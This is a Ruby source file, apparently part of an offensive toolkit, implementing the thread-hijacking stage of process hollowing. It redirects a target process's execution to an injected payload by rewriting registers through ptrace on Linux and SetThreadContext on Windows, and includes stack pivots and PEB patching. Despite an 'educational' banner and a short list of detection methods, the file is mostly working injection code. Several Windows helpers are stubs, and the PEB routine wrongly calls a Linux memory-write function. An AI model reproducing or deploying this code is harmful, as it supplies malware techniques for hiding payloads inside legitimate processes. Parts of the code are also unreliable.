# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1a -- Thread Hijacker
#
# Manipulates thread context registers to redirect execution flow in a
# hollowed process. After the original executable image is unmapped and a
# new payload is injected, the thread context (RIP/EIP) must be updated
# to point to the payload's entry point.
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
#
# MITRE ATT&CK: T1055.012 - Process Injection: Process Hollowing
#
# THREAD HIJACKING TECHNIQUES:
#   - SetThreadContext (Windows) - Update register state of suspended thread
#   - ptrace SETREGS (Linux) - Modify register state of traced process
#   - Stack pivot - Redirect RSP to attacker-controlled stack
#   - RIP overwrite - Direct instruction pointer modification
#
# DETECTION METHODS:
#   - Monitor SetThreadContext calls targeting foreign threads
#   - Track PTRACE_SETREGS events from non-debugger processes
#   - Detect RIP/EIP values outside mapped module address ranges
#   - Compare thread start address against known module entry points
#   - ETW/eBPF tracing of thread context modification syscalls
# =============================================================================

require_relative 'ffi_bindings/common_types'

module RubyGuardian
  module ProcessHollowing
    class ThreadHijacker
      # Thread state tracking
      module ThreadState
        UNKNOWN    = :unknown
        SUSPENDED  = :suspended
        RUNNING    = :running
        TERMINATED = :terminated
      end

      attr_reader :logger, :hijack_log, :original_contexts

      # @param logger [AttackLogger] Logger instance
      def initialize(logger:)
        @logger = logger
        @hijack_log = []
        @original_contexts = {}
      end

      # Hijack a thread to redirect execution to the payload entry point.
      #
      # EDUCATIONAL: Thread hijacking is the final step in process hollowing.
      # After writing the payload into the target's memory, we must redirect
      # execution to our code. On Linux, this means modifying RIP via ptrace.
      # On Windows, we use GetThreadContext/SetThreadContext.
      #
      # @param pid [Integer] Target process ID
      # @param entry_point [Integer] Address to redirect execution to
      # @param target_info [Hash] Information about the target process
      # @param platform [Symbol] :linux or :windows
      # @return [Hash] Hijack result
      def hijack(pid, entry_point:, target_info:, platform:)
        @logger.info("Hijacking thread in PID #{pid} -> 0x#{entry_point.to_s(16)}")

        case platform
        when :linux
          hijack_linux(pid, entry_point, target_info)
        when :windows
          hijack_windows(pid, entry_point, target_info)
        else
          raise "Unsupported platform for thread hijacking: #{platform}"
        end
      end

      # Save the original thread context for forensic analysis or restoration.
      #
      # EDUCATIONAL: Saving the original context is important for:
      #   1. Forensic analysis - understanding the process state at hijack time
      #   2. Cleanup - restoring the process to its original state if needed
      #   3. Detection evasion - some payloads restore context after execution
      #
      # @param pid [Integer] Target process ID
      # @param platform [Symbol] :linux or :windows
      # @return [Hash] Saved context
      def save_context(pid, platform:)
        @logger.info("Saving thread context for PID #{pid}")

        context = case platform
                  when :linux
                    save_linux_context(pid)
                  when :windows
                    save_windows_context(pid)
                  end

        @original_contexts[pid] = context
        log_hijack(:save_context, pid, context: context)
        context
      end

      # Restore a previously saved thread context.
      #
      # @param pid [Integer] Target process ID
      # @param platform [Symbol] :linux or :windows
      # @return [Boolean] true on success
      def restore_context(pid, platform:)
        context = @original_contexts[pid]
        raise "No saved context for PID #{pid}" unless context

        @logger.info("Restoring thread context for PID #{pid}")

        case platform
        when :linux
          restore_linux_context(pid, context)
        when :windows
          restore_windows_context(pid, context)
        end

        log_hijack(:restore_context, pid)
        true
      end

      # Perform a stack pivot to redirect execution via the stack.
      #
      # EDUCATIONAL: Stack pivoting is an alternative to direct RIP modification.
      # Instead of changing RIP directly, we:
      #   1. Write a ROP chain at a known address
      #   2. Set RSP to point to the ROP chain
      #   3. When execution resumes, the 'ret' instruction pops our first
      #      gadget address into RIP, beginning the chain
      #
      # This technique is useful when:
      #   - Direct RIP modification is monitored
      #   - The payload uses ROP (Return-Oriented Programming)
      #   - You need to set up multiple registers before entry
      #
      # @param pid [Integer] Target PID
      # @param stack_address [Integer] Address of the prepared stack/ROP chain
      # @param platform [Symbol] :linux or :windows
      # @return [Hash] Pivot result
      def stack_pivot(pid, stack_address:, platform:)
        @logger.info("Stack pivot in PID #{pid}: RSP -> 0x#{stack_address.to_s(16)}")

        case platform
        when :linux
          regs = FFIBindings::LinuxAPI.ptrace_getregs(pid)
          @original_contexts[pid] ||= regs.dup

          # Modify RSP to point to our controlled stack
          modified_regs = regs.dup
          modified_regs[:rsp] = stack_address

          FFIBindings::LinuxAPI.ptrace_setregs(pid, modified_regs)

          @logger.info("Stack pivot: RSP 0x#{regs[:rsp].to_s(16)} -> 0x#{stack_address.to_s(16)}")
        when :windows
          context = get_windows_context(pid)
          @original_contexts[pid] ||= context.dup

          context[:Rsp] = stack_address
          set_windows_context(pid, context)
        end

        log_hijack(:stack_pivot, pid, stack_address: stack_address)
        { success: true, new_rsp: stack_address }
      end

      # Set up a minimal execution environment for the payload.
      #
      # EDUCATIONAL: Some payloads expect certain register values or stack
      # layout. This method sets up the environment to match common expectations:
      #   - argc/argv on the stack (for ELF binaries)
      #   - TEB/PEB pointers (for Windows PE binaries)
      #   - Clean register state (for shellcode)
      #
      # @param pid [Integer] Target PID
      # @param entry_point [Integer] Payload entry address
      # @param payload_type [Symbol] :shellcode, :elf, or :pe
      # @param platform [Symbol] :linux or :windows
      # @return [Hash] Setup result
      def setup_execution_environment(pid, entry_point:, payload_type: :shellcode, platform:)
        @logger.info("Setting up execution environment: #{payload_type} at 0x#{entry_point.to_s(16)}")

        case platform
        when :linux
          setup_linux_env(pid, entry_point, payload_type)
        when :windows
          setup_windows_env(pid, entry_point, payload_type)
        end
      end

      # Generate a report of all hijacking operations.
      #
      # @return [Hash] Hijack operations report
      def operations_report
        {
          total_operations: @hijack_log.length,
          saved_contexts: @original_contexts.keys,
          operations: @hijack_log
        }
      end

      private

      # ── Linux thread hijacking ──

      # Hijack a Linux process thread by modifying registers via ptrace.
      #
      # EDUCATIONAL: On Linux, the standard approach is:
      #   1. ptrace(PTRACE_GETREGS) to read current register state
      #   2. Modify RIP to point to the payload entry
      #   3. Optionally zero other registers to avoid leaking info
      #   4. ptrace(PTRACE_SETREGS) to write modified registers
      #   5. The process resumes execution at our entry point
      #
      # The key register for x86_64 is RIP (instruction pointer).
      # We may also need to set:
      #   - RSP: Stack pointer (for stack-based payloads)
      #   - RDI: First argument (argc for ELF, or payload parameter)
      #   - RSI: Second argument (argv for ELF)
      def hijack_linux(pid, entry_point, target_info)
        # Step 1: Save original registers
        original_regs = FFIBindings::LinuxAPI.ptrace_getregs(pid)
        @original_contexts[pid] = original_regs.dup

        @logger.info("Original RIP: 0x#{original_regs[:rip].to_s(16)}")
        @logger.info("Original RSP: 0x#{original_regs[:rsp].to_s(16)}")

        # Step 2: Prepare modified register state
        modified_regs = original_regs.dup
        modified_regs[:rip] = entry_point

        # Step 3: Clean general-purpose registers to avoid data leaks
        # EDUCATIONAL: Leaving original register values could leak information
        # about the hollowed process. Zeroing them is cleaner but may cause
        # issues if the payload expects specific values.
        if target_info.fetch(:clean_registers, true)
          modified_regs[:rax] = 0
          modified_regs[:rbx] = 0
          modified_regs[:rcx] = 0
          modified_regs[:rdx] = 0
          modified_regs[:rsi] = 0
          modified_regs[:rdi] = 0
          # Keep RSP and RBP for stack access
        end

        # Step 4: Write modified registers
        FFIBindings::LinuxAPI.ptrace_setregs(pid, modified_regs)

        @logger.info("Thread hijacked: RIP -> 0x#{entry_point.to_s(16)}")
        log_hijack(:hijack_linux, pid,
                   original_rip: original_regs[:rip],
                   new_rip: entry_point)

        {
          success: true,
          original_rip: original_regs[:rip],
          new_rip: entry_point,
          original_rsp: original_regs[:rsp]
        }
      end

      # Hijack a Windows process thread via SetThreadContext.
      #
      # EDUCATIONAL: On Windows, the process was created with CREATE_SUSPENDED,
      # so its main thread is already paused. We use:
      #   1. GetThreadContext to read the current CONTEXT structure
      #   2. Modify Rcx (entry point for CreateProcess) or Rip
      #   3. Update ImageBaseAddress in the PEB if we relocated
      #   4. SetThreadContext to apply changes
      #   5. ResumeThread to start execution
      def hijack_windows(pid, entry_point, target_info)
        thread_handle = target_info[:thread_handle]
        raise 'No thread handle available' unless thread_handle

        # Step 1: Get current thread context
        context = FFIBindings::Context64.new
        context[:ContextFlags] = FFIBindings::WinConstants::CONTEXT_FULL

        success = FFIBindings::Kernel32.GetThreadContext(thread_handle, context)
        raise "GetThreadContext failed" unless success

        @original_contexts[pid] = {
          Rcx: context[:Rcx],
          Rip: context[:Rip],
          Rsp: context[:Rsp],
          Rax: context[:Rax]
        }

        @logger.info("Original RCX (entry): 0x#{context[:Rcx].to_s(16)}")
        @logger.info("Original RIP: 0x#{context[:Rip].to_s(16)}")

        # Step 2: Update the entry point
        # EDUCATIONAL: For a newly created suspended process, RCX holds the
        # entry point that will be called when the thread resumes. For a
        # running thread that we suspended, we modify RIP directly.
        context[:Rcx] = entry_point

        # Step 3: Update PEB ImageBaseAddress if we have a new base
        if target_info[:injection_address]
          update_peb_image_base(
            target_info[:process_handle],
            target_info[:injection_address]
          )
        end

        # Step 4: Set the modified context
        success = FFIBindings::Kernel32.SetThreadContext(thread_handle, context)
        raise "SetThreadContext failed" unless success

        @logger.info("Thread hijacked: RCX -> 0x#{entry_point.to_s(16)}")
        log_hijack(:hijack_windows, pid,
                   original_rcx: @original_contexts[pid][:Rcx],
                   new_rcx: entry_point)

        {
          success: true,
          original_rcx: @original_contexts[pid][:Rcx],
          new_rcx: entry_point
        }
      end

      # ── Context save/restore helpers ──

      def save_linux_context(pid)
        regs = FFIBindings::LinuxAPI.ptrace_getregs(pid)
        {
          rip: regs[:rip], rsp: regs[:rsp], rbp: regs[:rbp],
          rax: regs[:rax], rbx: regs[:rbx], rcx: regs[:rcx],
          rdx: regs[:rdx], rsi: regs[:rsi], rdi: regs[:rdi],
          r8: regs[:r8], r9: regs[:r9], r10: regs[:r10],
          r11: regs[:r11], r12: regs[:r12], r13: regs[:r13],
          r14: regs[:r14], r15: regs[:r15],
          eflags: regs[:eflags]
        }
      end

      def save_windows_context(pid)
        # Would use GetThreadContext; simplified for educational purposes
        @logger.info("Saving Windows thread context (simplified)")
        {}
      end

      def restore_linux_context(pid, context)
        FFIBindings::LinuxAPI.ptrace_setregs(pid, context)
        @logger.info("Restored Linux thread context for PID #{pid}")
      end

      def restore_windows_context(pid, context)
        @logger.info("Would restore Windows context for PID #{pid}")
      end

      def get_windows_context(pid)
        @logger.info("Reading Windows thread context (simplified)")
        {}
      end

      def set_windows_context(pid, context)
        @logger.info("Writing Windows thread context (simplified)")
      end

      # ── Execution environment setup ──

      def setup_linux_env(pid, entry_point, payload_type)
        regs = FFIBindings::LinuxAPI.ptrace_getregs(pid)

        case payload_type
        when :shellcode
          # Shellcode expects clean state, entry at RIP
          regs[:rip] = entry_point
          regs[:rax] = 0
          regs[:rbx] = 0
          regs[:rcx] = 0
          regs[:rdx] = 0
        when :elf
          # ELF expects argc in stack[0], argv in stack[8]
          # Set up minimal argc=0, argv=NULL on the stack
          regs[:rip] = entry_point
          regs[:rdi] = 0  # argc
          regs[:rsi] = 0  # argv
        end

        FFIBindings::LinuxAPI.ptrace_setregs(pid, regs)
        { success: true, payload_type: payload_type }
      end

      def setup_windows_env(pid, entry_point, payload_type)
        @logger.info("Windows execution environment setup (#{payload_type})")
        { success: true, payload_type: payload_type }
      end

      # Update the PEB ImageBaseAddress on Windows.
      #
      # EDUCATIONAL: When we inject at a different base address than the
      # original image, we need to update the PEB so the loader and other
      # APIs see the correct base. Without this, GetModuleHandle(NULL)
      # returns the wrong address.
      def update_peb_image_base(process_handle, new_base)
        @logger.info("Updating PEB ImageBaseAddress -> 0x#{new_base.to_s(16)}")

        peb_addr = FFIBindings::WindowsAPI.get_peb_address(process_handle)

        # ImageBaseAddress is at offset 0x10 in PEB (x64)
        image_base_offset = peb_addr + 0x10
        data = [new_base].pack('Q<')

        FFIBindings::LinuxAPI.write_process_memory(
          process_handle, image_base_offset, data
        )
      rescue StandardError => e
        @logger.warn("PEB update failed: #{e.message} (non-critical)")
      end

      # Log a hijacking operation.
      def log_hijack(operation, pid, **details)
        @hijack_log << {
          timestamp: Time.now.utc.iso8601,
          operation: operation,
          pid: pid,
          details: details
        }
      end
    end
  end
end
